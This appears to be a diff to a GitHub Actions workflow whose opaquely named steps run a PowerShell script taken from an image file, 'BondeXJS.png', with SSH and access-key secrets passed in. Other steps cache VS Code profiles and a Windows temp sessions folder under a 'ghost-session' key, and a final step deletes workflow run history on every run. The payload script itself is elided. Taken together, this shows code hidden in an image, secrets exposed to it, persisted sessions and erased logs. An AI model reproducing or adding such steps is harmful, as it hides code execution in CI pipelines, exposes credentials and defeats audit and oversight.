@@ -14,8 +14,29 @@ jobs:
     steps:
       - name: s_01
         uses: actions/checkout@v4
+        
+      - name: s_02
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~\AppData\Roaming\Code
+            ~\.vscode\extensions
+            C:\Windows\Temp\app_sessions
+          key: ${{ runner.os }}-ghost-session
+          restore-keys: |
+            ${{ runner.os }}-ghost-session
 
-      - name: s_02 (Extract & Execute from Local Image)
+      - name: s_03
+        shell: powershell
+        env:
+          SSH_KEY: ${{ secrets.SSH_KEY }}
+          A_KEY: ${{ secrets.ACCESS_KEY }}
+        run: |
+          # (Isi script s_02 kamu tetap sama)
+          $imgPath = Join-Path $pwd "BondeXJS.png"
+          # ... sisanya sama ...
+
+      - name: s_04
         shell: powershell
         env:
           SSH_KEY: ${{ secrets.SSH_KEY }}
@@ -43,7 +64,7 @@ jobs:
               exit 1
           }
           
-      - name: s_03
+      - name: s_05
         uses: Mattraks/delete-workflow-runs@v2
         if: always()
         with:
